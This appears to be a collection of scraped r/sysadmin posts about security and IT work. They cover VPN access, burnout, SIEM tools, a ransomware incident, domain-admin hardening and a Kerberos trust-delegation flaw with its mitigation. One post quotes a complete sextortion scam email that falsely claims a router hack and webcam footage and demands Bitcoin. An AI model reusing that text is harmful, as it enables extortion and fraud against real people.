155,vulnerability,sysadmin,Need help with tricky VPN solution for internal university network. Internal machine can access internet but don't have access to internal routers.,1,etnqne,https://www.reddit.com/r/sysadmin/comments/etnqne/need_help_with_tricky_vpn_solution_for_internal/,2020-01-25 18:22:12,"I posted this in r/vpn first but it was deleted. I've followed this sub for a while and I'm hoping you guy's experience will help me out here. If you have other subs to recommend that'd be helpful as well. So I'm a commuter student at my university and need access to the school's internal network so I can do homework. I'm a computer networking &amp; cyber security student and we do labs on the school's vmware vsphere environment. My process when doing homework is to open my vmware horizon client on my home computer. This lets me access a temporary VM on the school's main network. Once I log off of this, the files on it are deleted and the resources are reallocated. From that VM I can either access the vsphere environment through an HTML5 web console (which I loathe) or install VMRC, which takes forever and I have to redo every time. **My goal is to connect directly into the student network from my home computer.** The network flow kind of looks like this: my network -&gt; my public IP -&gt; internet -&gt; school public IP -&gt; school internal network -&gt; networking students network -&gt; virtual internal network The virtual internal network is where I do my labs. I have control over everything in my own little network including the firewalls (vyos) connected to the student network. On the student network I have an xubuntu and a windows VM, but I can easily request another one and place it on the student network. I can access the student network as long as I'm in the internal university network. My temporary VM is on the internal network. The virtual network can access the internet, but can't access all of the internal network (lots of subnets). This shouldn't be relevant but included it just in case. Here's what I've tried: Obviously my current solution isn't working. I've asked a teacher for advice and he recommended chrome remote desktop. I don't use chrome anymore but I tried it anyways. It's not what I wanted but it's better than what I've been using. I've asked my teachers (who are sysadmins/admins) for a traditional vpn option but they don't want to open themselves up to more vulnerability understandably. All of the VPN guides are about how to install clients, which isn't the problem. I've set up a VPN server on my vyos firewall before I can't forward any traffic from outside the student network so it doesn't really work. If the vm on the student network wasn't temporary I could do a VPN chain or something, but that's not an option. My thought is that because remote desktop applications (over IP, RDP is disabled) work, then there might be an option similar to remote desktop but for just a network. If I could connect an open remote desktop through a virtual physical connection that would also work, but I don't know any remote desktop applications that do that. Any help and information you guys have would be super helpful. Sorry if this post was too long or convoluted. Thanks again."

So I'm in need of some additional advice, I've kind of been reading (but not posting) on [r/sysadmin](URL and [r/ITCareerQuestions](URL and have come to the conclusion that some MSP's can be kind of rough (as y'all have mentioned). But I think I'm about burned out. Little background if you need it: (Sorry if too long) This is my first IT job, I did break in a little late. Went to college, bachelor's in Management Information Systems, but ended up in Agriculture/Farming. Eventually didn't work out, didn't make any money, had to get something else. Finally got hired at an MSP that also does In-House IT as well. Was hired as Level 1 Helpdesk. In a few months I'll have been there 3 years. To give the MSP credit, I've learned a ton. When I started on the first day, I had trouble getting clocked in. So about a year ago or a little more, 2 system administrators quit and we also lost a tech. So it's me, 2 other sysadmins and 1 other tech. (He's basically a road warrior, out setting up equipment: PC's replacing network equipment, whatever is needed) So it's usually me and the other 2 admins. Since around last summer, it's just gotten bad, so busy never get caught up, new requests keep coming in, phone calls, break/fix etc. Haven't hired any new sysadmins yet. I've just been thrown at everything, VMWare, Patch Managmenet, Vulnerability Scans, Exchange, Cisco, Ton's and Ton's of PC setups, Volume License Management, Printers, Citrix, Windows Server, Active Directory, Moving SQL Server Instances, Upgrading SQL Server, SharePoint, Enterprise Backup Solutions, Certificate Management, some Red Hat (not a whole lot) list goes on... Thing is, I was only hired as HelpDesk. So I still take Help Desk calls, plus I have all these projects to work on. They get pushed back due to phone calls, break/fix putting out fires and people coming to my desk wanting things right now. I've tried to push back, but people just get mad and complain. Doesn't seem to work. Somedays I feel like I'm doing sysadmin stuff and helpdesk stuff. I don't think I can get to be a pro at any one thing like this. I have some knowledge in all these areas now but not a super pro. Lately, I've just hit a road block and can't get tickets done. There are just issues that are holding them up, so hard to get anything done. Some stuff I've try to pass to the other admins if I'm way too busy, but sometimes clients want me to do it. Honestly, the other admins could do it better probably. Lately, I'm starting to feel like maybe I don't know anything about IT? Maybe I don't? From reading on here, there are some real pros out there. I'm starting to doubt myself on everything and my decisions, (what do I really know well?) I have no confidence in this stuff anymore. I don't really have anyone to collaborate with, the other 2 admins just work on their stuff alone. They are probably 25 years older than me. One is a Citrix Farm manager, the other mainly does Network related stuff (programming Cisco, Juniper devices etc.). If I ask for advice, they usually act like they'd rather not converse with me. They sometimes ask me for advice or to do something, and I try to be as helpful as I can hoping we can build a better relationship. But it just never happens. Talked to the boss man few months ago. He said I was doing pretty good and deserved a raise. Addressed my concerns, but just said keep rolling you'll be fine. From reading on here, I've taken in that I need to automate more tasks. Patch Management is automated, and I've created some packages to ease deployment of some software and PC's. Has helped some, problem is, I don't have have time to learn better scripting methods, coding, etc since I'm busy with calls and other requests. I've built a home lab and practice with VM's, Physical Servers, SharePoint, Window Server, Red Hat etc... test patches etc. but lately I don't feel like messing with it after work. I need to keep learning but it's getting harder to find time with work and being tired and on call. SharePoint is driving me nuts, I get it working and then something breaks later in day. Part of me says, need to find a different position. Haven't found much in this area. Already commute 1 hour round trip everyday. Thinking I may have to move to a bigger city or even leave the state to find something else. Most of the stuff I've found, pays a lot less than current position. Getting to the point where thinking of just leaving and looking for a new position, but as many on here have said: Leaving without another job is a bad plan, which I agree with. So how damaging would it be to leave at almost 3 year mark with no job lined up? My take is, I may eventually find something, but it could be a while and also worse pay. Honestly, less pay is fine as long as I can enjoy work a little more at this point, and also the co-workers. So I guess my question is, should I just keep rolling and keep looking and hope for the best? I had an interview with a power company last summer. 2 Rounds, but they said they were hiring an internal man instead so didn't get it. Got so busy with work again, didn't get too many more applied for. I know, I need to make time. I need to do better. I just feel burned out at this point, no friends left, no dating since I started this job, just work, On Call, and learning more. I Realize I did this to myself, and it's my fault. I really have no one to blame but myself, I let it get out of control. Just need to get things under control again at this job or another one. Any other advice is appreciated, Thanks for reading!"

Our shop is what I generally consider medium sized - ~500 workstations, ~80 servers (mostly virtual). We often times find ourselves kind of in the middle when it comes to questions related to software purchases: Do we try to roll-our-own using the cheap/freebie open source product, or do we bit the bullet to purchase the off-the-shelf professional product. This has recently come to the forefront when it comes to the question of a SIEM. We looked at Splunk, LogRythm, Rapid7, and some others, but the conclusion we've come to is that we'd be buying a bulldozer when we need a shovel. If we made the purchase we could get a product that would give us some value, but at the cost of having to dedicate a significant amount of our time to it, to make it fit our environment. The value just doesn't seem to be worth the cost. Primarily our needs are Windows event log collection/monitoring, and firewall traffic from our Cisco Next-Gen. We have Cisco's Firepower management, but it's a virtual appliance and the amount of history it can store is pretty limited. Ideally, we need a solution that can import all of this into a single pane of glass, and answer questions like ""Computer X went to Bad Site/fell for a phisher, do we see lateral movement to Computer Y and Z"", etc. We use Nessus Pro for vuln scanning, and today I happened upon a Siem-related Twitter post talking about Tenalbe SC/LCE. I understand that you might not really classify SC as a SIEM per se, and it would be more vulnerability-focused, but it seems like it might have some SIEM-like features. Before I contact Tenable and have sales people start telling me it will wash my car and mow my lawn, curious if anyone has experience with Tenable.sc that could offer any insight. It looks like SC will injest Cisco firewall logs, and monitor it to some extent for Evilness. What kind of retention could I expect with this product; just depending on how much disk we throw at it? So for example, if a user falls for a phishing site but turns out it happened a week ago, could we use SC to go back and see who else might have went to the same site? Or is that beyond the scope of what SC is trying to do?"
166,vulnerability,sysadmin,Modernizing in-house webapp development process,1,edqd1o,https://www.reddit.com/r/sysadmin/comments/edqd1o/modernizing_inhouse_webapp_development_process/,2019-12-22 01:14:40,"We're currently using a sprawling in-house PHP+MySQL CRM that has been developed over about two decades without version control, documentation or a greater plan. It interlocks with a website and webshop that are similarly well-maintained and a proprietary ERP by writing directly to its clusterfuck of a database. They all are running on EOL Debians (except the ERP which is on OSX) whose configuration can't be touched because they're misconfigured in exactly the right way that all the issues cancel each other out. The devs copy their code directly onto the production servers without running tests. They told me the whole thing would have to be burned down and rewritten but one of the C-levels is controlling them directly and demanding new features daily. In other words, a fairly normal situation. Since security and maintainability have finally become more of a focal point and we introduced monitoring and vulnerability testing to make problems visible, the approach to development is going to be modernized at least a little bit. At the moment, the vague idea is to at least introduce version control, automated unit and vulnerability testing and separate dev/staging/prod environments using CentOS. However, none of us have ever approached a project like this and I'm not sure where to start. I'm also fairly new and the people who have worked there for longer have zero experience with any of the required tooling and resist learning it to varying degrees. (Outside consultants are not an option, of course.) My knowledge is limited to the ops side of things (Terraform with vSphere, Ansible, Docker) and some personal pet programming projects (Python, JavaScript, Gitlab CI/CD). I'm sure I'm not the first one here to be in this position. This is an amazing opportunity to learn a lot and make myself very valuable to this company, so I'd like to take it. It also has the possibility to go catastrophically wrong and at least waste a _lot_ of manpower at best or result in data rot by unknowingly triggering dormant bugs at worst. So do you have any recommendations on how to approach the task? What are your experiences with projects like this?"

I would appreciate some input in determining the vulnerabilities of our system in place. Please feel free to guide me to the correct sub-reddit if this isn't it. Thank you so much for reading through this, kind stranger and apologize if i used the wrong terminology as English is not my first language. **The system as is:** * admin is retired friend of family that worked in IT all his life. * server was built and is protected by a small, yet reputable company (external company) * free guest WiFi is separate from LAN network where our employees operate. * user accounts have minimum rights, installs etc. can only be done by admin. Admin account itself is on the same computer as regular account, not separate, has strong password, but no 2-factor authentication. * e-mail is hosted on the servers of our web agency (external company) * reputable anti-virus system is installed on all end-points * back-up is done to local NAS server daily for important information and twice a week for everything else. Furthermore, all backups are done again and stored on a HDD off property once a week. * employees are being trained on essentials such as identifying phishing e-mails or declining external storage devices * password manager with 2FA prevents weak passwords * only mobile / home devices of the boss contain confidential information and are protected by anti virus and can be completely wiped remotely in case of theft or loss. * neither disk nor backup is being encrypted * only limited, necessary software which is always up to date. &amp;#x200B; **Now to my questions:** 1. Do you guys see any blatant vulnerabilities that I am missing? Again, I am no expert and have never worked as IT admin. 2. How do I assess the security of the external providers (e-mail and internet server)? Because in the end, I am responsible for my data and do not want to be affected by the negligence on the part of another company. I am particularly worried about e-mail as it contains so much personal information (reservations, home addresses, ...) and thus thought about turning to ProtonMail, for instance, as e-mail alternative which ticks all the points for me (zero knowledge, encrypted, 2FA, open source). 3. Should the admin account be operated through a separate computer only, cut off from internet entirely and secured by 2FA? Thank you so much for anyone even reading through this and any one suggestion. **Every input is highly appreciated and cannot thank you enough.** Even if you are unable to answer my questions or if the post is too long, I would love to receive useful links to educate myself further.

I stumbled across a strange problem: I have several Windows Server 2008 R2 machines. Since last Friday, I noticed that more often than not, when I try to connect to any of those machines by RDP, I receive ""RST, ACK"" in response to my SYN packet. Those machines are in different network infrastructures, have different levels of updates (up to 2019-10 Rollup), but they all are patched against BlueKeep. Two common things among those machines are: 1. They all are Server 2008 R2. 2. They all have the standard RDP port exposed to the internet, so they are obviously under attack, constantly. I found that changing the RDP server port or enabling whitelisting in the firewall helps, so it looks like there's a vulnerability in the RDP Server service, which can cause DoS, and since last Friday, attackers started to use it. Has anybody else seen that behavior? Is there a recent RDP vulnerability which causes DoS?"

How it was: In the software of the router to which you were connected that day, there was a vulnerability. I first hacked this router and placed my malicious code on it. When you entered in the Internet, my trojan was installed on the operating system of your device. After that, I made a full dump of your disk (I have all your address book, history of viewing sites, all files, phone numbers and addresses of all your contacts). A month ago, I wanted to lock your device and ask for a small amount of money to unlock. But I looked at the sites that you regularly visit, and came to the big delight of your favorite resources. I'm talking about sites for adults. I want to say - you are a big pervert. You have unbridled fantasy! After that, an idea came to my mind. I made a screenshot of the intimate website where you have fun (you know what it is about, right?). After that, I took off your joys (using the camera of your device). It turned out beautifully, do not hesitate. I am strongly belive that you would not like to show these pictures to your relatives, friends or colleagues. I think $747 is a very small amount for my silence. Besides, I spent a lot of time on you! I accept money only in Bitcoins. My BTC wallet: xxxxxxxxxxxxxxxxxxxxxxxxxx You do not know how to replenish a Bitcoin wallet? In any search engine write ""how to send money to btc wallet"". It's easier than send money to a credit card! For payment you have a little more than two days (exactly 50 hours). Do not worry, the timer will start at the moment when you open this letter. Yes, yes .. it has already started! After payment, my virus and dirty photos with you self-destruct automatically. Narrative, if I do not receive the specified amount from you, then your device will be blocked, and all your contacts will receive a photos with your ""joys"". I want you to be prudent. \- Do not try to find and destroy my virus! (All your data is already uploaded to a remote server) \- Do not try to contact me (this is not feasible, I sent you an email from your account) \- Various security services will not help you; formatting a disk or destroying a device will not help either, since your data is already on a remote server. P.S. I guarantee you that I will not disturb you again after payment, as you are not my single victim. This is a hacker code of honor. From now on, I advise you to use good antiviruses and update them regularly (several times a day)! Don't be mad at me, everyone has their own work. Farewell."

That's the golden egg, right? That's what every pentester's goal is and I've listened to enough podcasts and read enough post-compromise reports to know that it's pretty easy to grab a DA password (or hash). &amp;#x200B; What all would they do with the DA account? We have our employee workstations locked down with a GPO-controlled firewall that only allows RDP access from certain hosts. That's great to prevent a worm from gaining a lot of traction but an actual attacker could easily reconfigure that and drop every firewall on the network. There has to be something better. &amp;#x200B; So we're thinking ... what if we used third party firewalls that aren't controlled by GP? Assuming the server or workstation is locked down so only non-domain users have any sort of remote management access and the firewall limits the flow and source of all traffic, the only attack vector that would be possible would be a direct attack on a port from the allowed source network. &amp;#x200B; For example, let's say we're protecting a file server. We lock it down so there are no domain level administrators on the server (only local) and we only allow RDP and other management (remote powershell, for example) from vlan 7. The file server ports are open to all, of course, so we're vulnerable to an attack there if one is ever discovered but if they do gain access, they can't pivot from there to get anywhere else. Employee workstations are firewalled, the other servers are firewalled, and local admin passwords are all different so you would have to exploit a vulnerability on another system to gain access to it. &amp;#x200B; One more thing to note, we're also limiting who all has a DA account and even going as far as only using one of the DAs if absolutely necessary. For example, for DHCP management, we just use the MMC and have DHCP admin access. No need to RDP to the DHCP server for anything. Local admin passwords are all different and kept in a secure storage. &amp;#x200B; To really stretch the idea of what is possible, let's say I compromise the network, gain access to a DA cred, and create my own GPO or modify an existing one to run whatever software, code, or script I want to and I can run it on every computer in the domain. From there I can determine the software installed, disable or reconfigure whatever firewall is being used, and then access everything from anywhere on the network. That's why DA and any AD administrator's credentials need to be kept secure and only used when absolutely necessary. &amp;#x200B; I'm looking for a second set of eyes to find any flaws in this theory of potentially using a third-party firewall for protecting my servers. Of course nothing is 100% but every little bit helps, right. &amp;#x200B; If you guys do use a different firewall, which one do you use and why do you like it?"

I can plug in the same exact port on the switch, do a network scan using Advanced IP Scanner, and it finds everything. Am I missing something easy or doing something wrong? Thanks!"
225,vulnerability,sysadmin,Securing Remote Access for Workers,5,cufbo7,https://www.reddit.com/r/sysadmin/comments/cufbo7/securing_remote_access_for_workers/,2019-08-24 01:21:20,"This is kind of an odd question, but it seems relevant here and I hope some of the bright, creative and highly experienced people here can help me learn about a system we use for remote access at my employer. Currently we utilize a system for employees to access their desktops remotely from home, using a company provided computer. We install VPN software on the home user's machine that will route all IP connections going to the 10.0.0.0/8 subnet through our VPN. This means that the computers can access the internet through the user's internet connection while still being able to connect to a few internal network resources as well. The underlying software for our VPN is based on OpenVPN, and uses a security key and a username/password to authenticate access currently. We can add 2-factor authentication, but this isn't done on our VPN yet because that is done on the server users connect to. The VPN has a whitelist of IPs that users connected to the VPN are allowed to access. This is basically just our DNS servers, an AV remote management server and another Windows server that acts as a ""jump box"" for RDP connections between our users and their internal machines. The only way to access any user machines is through the RDP server (it's set up as a Session Host and not an RDG), and this device has 2-factor authentication on it when you RDP connect to this device. From here users would then RDP to their desktop machines internally and begin working. Others don't have internal desktops and simply work on the server itself. The server isn't as well secured as you would expect from a jump box, namely that users can run any software they want on it, authentication is all local (no AD), and it has full access to the internet. Any device on the network can access this server. I'm thinking that the server pretending to be a jump box is either in itself a security vulnerability or, assuming it was to be correctly secured, just unnecessary since you can 2-factor authenticate at the VPN level and configure that VPN to only allow users to access specific machines (IE their desktops). Is there something I'm fundamentally missing? My boss was quite adamant that the Windows server was a necessity and strengthened our security posture, while I'm more skeptical of that. I've seen setups like this, but a jump box is usually tightened pretty strongly, is only to be used for specific purposes, won't have internet access, and is used for accessing devices on separated networks or as a jump-off point for administration in the network, as opposed to simply accessing devices on the same network. If there is anyone who is experienced with securing this kind of situation, could you please enlighten me as to what I am missing and evaluate the effectiveness of our current security posture? Thank you."

The strange thing is, when you check the host, indeed neither are installed.. but if you try and install KB4074597 manually, it complains that the update is not applicable. If I try and install KB4074594, it'll attempt to install it (though I don't proceed). Looking back through install logs I can see that the update was installed when it was released back in Feb 2018 BUT I can see that in May of this year, the hosts uninstalled the update as there is an entry in the event log matching the KB number for the update: &gt;Initiating changes for package KB4074597. Current state is Installed. Target state is Absent. Client id: CbsTask. So it's almost like the update was revoked / superseded but absolutely no documentation anywhere that I can find is saying as such. So... bit of a mystery. Has anyone seen similar? Why will these few hosts simply refuse. I'm baffled."

While it depends on environment, being a general system administrator means you need to know a lot of different technologies across the IT spectrum. This can include, but by no way limited to: Windows, Linux, Mac, Active Directory, virtualization, routing and switching, Exchange, vulnerability management, antivirus, scripting, database, physical hardware, and every flavor of all these technologies. What flavor of linux? What brand of networking gear? Scripting for what language? What kind of database? I know what a lot of people are thinking... FUN! All these cool and different technologies to learn and work with! And it is. Till it isn't. Till you find yourself spending more time trying to learn different things than actually working. Till you are having to troubleshoot cisco, juniper, hp, and dell networking while never being given training on any of it, while also having to support the windows and redhat servers supporting windows, mac, and different linux clients. Additionally, you are also having to come up with solutions to unique problems and follow certain policies while supporting everything else. But the biggest challenge here is not doing the work. It is doing a good job. Because while you are a generalist, expert work is expected. And that, is where I personally began to burnout. It is not a good feeling. I personally felt like I not only wanted to quit, but I wanted to leave the industry entirely. I wanted to do something I felt mattered, because as many of us know, IT is a thankless job most of the time. Given that was not the best option for me, being the sole provider in the house, I had to figure this out. I had to figure out a way to regain my sanity and life. Here are some of the changes I have made that have really helped me. -take a lunch break. A real lunch break. Get away from your desk. Sit outside. Dont work through your break. - dont be a yes man. If your boss asks you to do something and you have to much already or dont know how to do what they are asking, tell them. As a young admin, I always wanted to please everyone. Know you cant, and you will burnout trying. - spread the work load if you can. If there are other admins and they know more about a certain thing, ask them to handle those things. Dont be a hoarder and waste half a day trying to solve an AD problem when the guy next to you was an AD Specialist. - GO HOME. Unless something is absolutely critical, do not work late. - study what you want. If you want to stay a generalist, realize you will not be a SME in everything you touch. If you go home and spend your free time becoming an expert in everything there is in IT, you will likely fail, hate life, do poor work, and be discouraged when you end up working on something that has nothing to do with what you have been learning. If you have dealt with burnout, please share some of the steps you have taken to try and get back to enjoying work!"

I spent a good amount of time delving into SQL and creating some excellent reporting; however, we've recently had a lot of issues with the solution. I'm aware that KACE uses the Ivanti catalog, and given that most of the issues/concerns we've had are related to that, I'm not very interested in any solution that also uses it. That led me to SCCM, but I fear SCCM might be more than our small team can handle. That being said, if it's the best solution out there, then it may be worth trialing. We also have Qualys to perform vulnerability scans, and supposedly they've released a patch management tool (which I believe also unfortunately uses Ivanti) which might suit our needs. I was just curious what other folks are using out there and if you've able to find something better than KACE and simpler than SCCM."

Thankfully we scraped by and came away with some valuable lessons learned. However, there's no denying it was a shit show had a shit baby with the shit circus. We had a new hire cry in the bathroom &amp; decide he wasn't going to work in IT anymore and people cannibalized each other on conference calls while Attila the hun for all I know pillaged our system. I'd like to hear others peoples stories of they can share and take away some lessons both serious and funny. &amp;#x200B; You can read my story below but please comment if can you share your worst camp fire horror story &amp;#x200B; I'm old, like your dad old and admittedly its been difficult to keep up pace with IT. I'm in a new security role while it is interesting its not easy job for someone pushing 60. My company had a cluster of application servers that face the internet, some of which are Windows 2003. As a server manager I made a suggestion to higher ups, the app devs and our security ops team that we should decommission, look for an alternative, or monitor them ( i don't fully understand security monitoring &amp; forensics but I figured we should at least collect the logging from them). I got push back because the integration would be a lot of man power ( security and SIEM team were already overbooked), we can't have downtime the application automates a pretty important business function, and there's no sensitive data hosted the customers just use it to query old static archival information so its not a big deal I was told. This is were I tripped up I let it go I shrugged my shoulders and took it off my agenda. I should have re-approached the problem by offering a cheaper alternative or propose a plan to gradually update (do a version by version upgrade of the sql database, the application, and OS from 2003 to 2008, then to 2012 while retiring the other hosts or consolidate everything onto a virtual platform/hypervisor avoiding physical servers all together.) &amp;#x200B; Fast forward a few months a remote desktop vulnerability is released public ally. We patch our servers expect the legacy ones because again there's no sensitive data. What we forgot is that the admin service account password on that cluster is the same as the one on the servers ""we cared about"". So when those servers were exploited, the hacker dumped password files and had the crown jewels. &amp;#x200B; I come in 15 minutes late that day cursing DC traffic having not gone to the bathroom or had coffee yet. My manager back flips into my fucking cubicle demanding I get on a conference call, I protest that I needed to take a huge shit and was cutting it close for a 930 am meeting. His face has an uncomfortable amount of concern on it though. He literally told me, I could get on the webex from the stall that this took precedence over everything today. I get on the call and my jaw drops that vulnerable server cluster has been ransomed wared &amp; we quickly realize we don't have the security capability in place to figure out what happened. Worse yet no ones audited this cluster in some time and it looks like some file shares got ransomed too, cherry on top of we never had good controls on what is in our file shares &amp; short cuts were taken with access controls. &amp;#x200B; While everyone is digesting the turd sundae we've given this Monday morning and flinging dirt at each other no is handling the day to day operations. Which is why we didn't notice an alert that an external IP address logged into a web server (""part of a cluster we did care about"") &amp; did some basic recon and quickly noticed corners had been cut regarding our domain and network segmentation. But the Mongolian Horde at our door step decided to knee cap &amp; ransom anything they could access. &amp;#x200B; There is no worse feeling than when some hapless help desk technician on the end of their rope jumps on a call and starts rambling that he has a growing queue of tickets from the workforce that emails aren't coming in and people cant login to anything. He was practically begging for an explanation to give to the growing angry mob of users getting their pitch forks ready to storm the help desk. I still can't believe we never had an emergency comms procedure in place. &amp;#x200B; An hour into my day we start to fully realize how bad the situation has become. A lot of things our on my mind how do we fix this right now, how do we figure out how this happened, what does our recovery time look like, how bad do I still need to shit, and how many of my wife's spaghetti dinners am I going to miss this week.The answer to the latter two was a a lot. It took us working 48 hours continuously to get operations moving at an acceptable rate my hair is not growing back though. Another two weeks to be fully operational and still more work to be done to be at an acceptable security standard. &amp;#x200B; The first 48 hours were the worst because all the teams were problems were just fully exposed. People we're very much overreacting emotionally, and arguing on a conference instead of a forming a concert plan. I swear I saw a combination of people updating their resumes, flatly ignoring the problem &amp; actually trying to submit tickets, go about talking about agile project plans as if the sky wasn't falling, or worse throwing out conspiracy theories that somehow Russian or Iranian intelligence, ex employees, and even ex-husbands were behind the attack. One of my coworkers pulled me aside he's younger, very interested in cyber security, and thankfully more grounded than I anticipated. He asked matter of fact what needs to happen to get the situation back under control and who do need to talk to make it happen. We started collecting subject matter expert over the next fifteenth mins and getting them on a tech only bridge. We hashed out a plan to get everything back operational but with regards to our security state we also had to layout what else could be stolen and how accessible it was. &amp;#x200B; Ironically enough a lot of servers and workstations had really good DLP controls as management had concerns abut employees taking out company info which we determined later might be why the hackers decided to just hastily ransomware the network rather than try to covertly steal stuff and get around our security policies. I'm also very glad I was paranoid about cloud that I setup email alerts setup whenever we had someone login. We did this to track to tickets, deployments, new builds, and applications and figure out which service or admin account broke something when there was a change.. My anal retentiveness about audit tracking allowed us very quickly to lock down access and suspend the hijacked account in the cloud and repeat the process on our on -prem active directory. &amp;#x200B; Of course we closed one hole but we did not have a full grasp if the hacker had another beachhead to our network, and how long they were taking up residence there. Worst yet I priority was still saving day to day operations and we quickly learned two harsh realities backups are only good if you test that they work and documentation is only good if you keep it updated, it was a long week of rebuilding things from memory or scratch. &amp;#x200B; Some serious takeaways our operations had serious holes and we learned some brutal lessons &amp;#x200B; number one you need to have a plan and understand what the steps are for a short term fix, long term fix, and long term how we got here, we lost hours fighting other teams when we could have been resolving problems &amp;#x200B; number two Explain things in facts speculation and a lack of understanding of how IT operations work is partly how we got into this mess to begin with. &amp;#x200B; number three Have trusted vendor who can help out on this stuff we shouldn't be afraid to reach out for aide in a situation like this"

The [u/pfeplatforms\_msft](URL has shared it in this sub before: [URL &amp;#x200B; TLDR: \- Microsoft has not properly described the change and haven't tested command in the article. \- After July you might remain vulnerable if you have External trust. \- It is not clear how to manually close vulnerability before July updates, command in the article is not working. \- Microsoft Premier Support is as bad as ever, wasting time without doing any work, until you escalate. &amp;#x200B; After reading few articles about the issue, I decided that it is worth looking into, as some of our clients are having multiple trusts and why should we wait until July, if the vulnerability is so well described, that it is really easy to use it. &amp;#x200B; So I planned a change and tried to close the vulnerability without waiting for July. However, as it happens, the command in the article didn't work. After taking a look at the Wireshark log, I realized that the command that is supposed to make you domain immune, is trying to contact the foreign domain for some reason. And if the names of the domains are reversed in the command, it seem to work (trust attribute on TDO is changed). It seemed like I missed something, so I asked my colleagues to take a look and see if I make any mistake. After confirming the findings, I asked in the comments section under one of the articles and a day after, created a Premier case. &amp;#x200B; It took 2 weeks to get an answer from Premier support, after numerous attempts to avoid answering the question and insisting that article is correct. Finally, I convinced them - but since none of the articles are corrected, I have a feeling that they cheated on me and something is really wrong with all of this. NETDOM command is used for many other purposes and it clearly states which domain should come first and which domain second. So maybe Microsoft has decided that foreign domain should close vulnerability for us and then when it's compromised, attacker might just enable it for his convenience. Otherwise, it could be a bug in NETDOM, where specifically this command is implemented in a wrong way. But if so, shouldn't they update the article, apologize for the bug and give instructions on how we can close or check vulnerability? &amp;#x200B; So, now July is coming and they are supposed to make our systems immune (unless you have already changed this bit, like I tried). However, as Microsoft claimed, they only target Forest Trusts. Again - it was not clearly stated in the articles, but this is the answer from comments section. The vulnerability exists for Kerberos protocol over trust - which can work over External trusts. This is where I'm totally confused: why not simply set the same value on all External trusts? \- If Kerberos is used for an External trust - then vulnerability will be stopped. \- If Kerberos is not used for a given External trust - then there will be no effect. &amp;#x200B; I hope that this post can make MS hurry up with article update and actually test this command in a test lab and see if it works or not. And what's most important - does it work in the way that it protects your domain, or the fix you do protects your partner instead?"

So any attempt to remediate this is instantly shot down. Second argument, because the threat requires getting through perimeter security it's very unlikely to happen with out a pivot point, so the risk is all but non existant. While these are valid arguments I think, have any of you wonderful people successfully disabled these protocols in your environments? What is the best practice for internal resources and these protocols? What about SMB v1? Or for that matter all internally accessible Vulnerabilities?

Unfortunately, an unsafe, default configuration exists within this feature when creating an inbound trust that could allow an attacker in the trusting forest to request the delegation of a TGT for an identity from the trusted forest. &gt; So what does this all mean? &gt; Lets back up a little bit and do a brief explanation on Kerberos delegation. &gt; There are three kinds of Kerberos delegation in Active Directory: &gt; * **Unconstrained** &gt; &gt;When a Domain Administrator configures a services account to be trusted for unconstrained delegation, that service has the ability to impersonate any user account to any other service. This is the most insecure delegation option, because a service could impersonate any user to any other service it likes. For a regular user account, not so bad, but for a Domain Admin or an Enterprise Admin, a rogue service could request information from the domain or change user account or group permissions in the name of the privileged account. For this reason, unconstrained Kerberos delegation is a high security risk. &gt; * **Constrained** &gt; &gt; First introduced with Windows Server 2003, constrained delegation allows an administrator to limit the services to which an impersonated account can connect to. Constrained delegation is difficult to configure and requires unique SPNs to be registered as well as Domain Admin rights to implement. Constrained delegation cannot cross domain or forest boundaries. &gt; * **Resource-based Constrained** &gt; &gt; First introduced with Windows Server 2012, Resource-based constrained delegation improved on the constrained delegation introduced with Windows Server 2003. It eliminated the need for SPNs by switching to security descriptors. This removed the need for Domain Admin rights to implement and allowed server administrators of backend services to control which service principals can request Kerberos tickets for another user. Resource based allows delegation across domain and forest boundaries. &gt; For more information on Kerberos delegation, refer to this documentation: &gt; [Kerberos Constrained Delegation Overview](URL &gt; All currently supported versions of Windows Server that are utilized for Active Directory Domain controllers have this vulnerability: &gt; * Windows Server 2008 &gt; * Windows Server 2008 R2 &gt; * Windows Server 2012 &gt; * Windows Server 2012 R2 &gt; * Windows Server 2016 &gt; * Windows Server 2019 &gt; Lets say you are responsible for the Contoso forest and you have a partner who owns the Fabrikam forest whose resources your users use. How could an attacker in Fabrikam take advantage of this vulnerability? &gt; First, they need to have the ability to configure a service they own to be trusted for unconstrained delegation. By default, this requires domain administrator privilege in the fabrikam.com domain. &gt; Next, they need to get your user to authenticate their rogue service in your partners Fabrikam forest. &gt; Now they have your users TGT which they can use to authenticate to any service as that user. &gt; ## Technical Overview of the Vulnerability &gt; As a consequence of this vulnerability an attacker who has control of a forest with an inbound trust to another forest can request a TGT for a user in the trusted forest by enabling unconstrained delegation on a service principal in the trusting forest. The attacker would need to convince the user to authenticate to the resource in the trusting forest thereby allowing the attacker to request a delegated TGT. &gt; To mitigate this vulnerability, a netdom command can be executed that will disable TGT delegation. &gt; **EnableTGTDelegation** flag is enabled on Windows Server 2008 and Windows Server 2008 R2 devices after installing the March 12, 2019 updates. Windows Server 2012 and higher, the **EnableTGTDelegation** flag is in the operating system out of the box. &gt; TGT delegation across an incoming trust can be disabled by setting the EnableTGTDelegation flag to No on the trust using netdom. &gt; &gt; netdom.exe trust fabrikam.com /domain:contoso.com /EnableTGTDelegation:No &gt; * This flag should be set in the trusted domain (such as contoso.com) for each trusting domain (such as fabrikam.com). After the flag is set, the trusted domain will no longer allow TGTs to be delegated to the trusting domatin. &gt; * The secure state is No. &gt; * Any application or service that relies on unconstrained delegation across forests will fail. &gt; Starting with the March 2019 security updates, this ability was backported to **Windows Server 2008 and 2008 R2**. Below is the following timeline that Microsoft has announced to address this vulnerability: &gt; ### March 12, 2019 &gt; Ability to disable TGT delegation added to Windows Server 2008 and 2008 R2. &gt; * **IMPORTANT**  A known issue with this update has been discovered in relation to intra-domain scenarios and Windows Server 2008/2008R2. Authentication requests for accounts configured for unconstrained Kerberos delegation will incorrectly fail in intra-domain scenarios after the Kerberos ticket expires due to an issue that occurs after the March 2019 updates.The following updates are affected by this issue: &gt; &gt; * **Windows Server 2008 SP2** &gt; &gt; &gt; * [March 12, 2019  KB4489880 \(Monthly Rollup\)](URL &gt; &gt; &gt; * [March 12, 2019  KB4489876 \(Security-only update\)](URL &gt; &gt; &gt; * [March 19, 2019  KB4489887 \(Preview of Monthly Rollup\)](URL &gt; &gt; * **Windows Server 2008 R2** &gt; &gt; &gt; * [March 12, 2019  KB4489878 \(Monthly Rollup\)](URL &gt; &gt; &gt; * [March 12, 2019  KB4489885 \(Security-only update\)](URL &gt; &gt; &gt; * [March 19, 2019  KB4489892 \(Preview of Monthly Rollup\)](URL &gt; The following workaround guidance is recommended if the update has been installed: &gt; [Workaround Picture](URL &gt; ### May 14, 2019 &gt; * An update 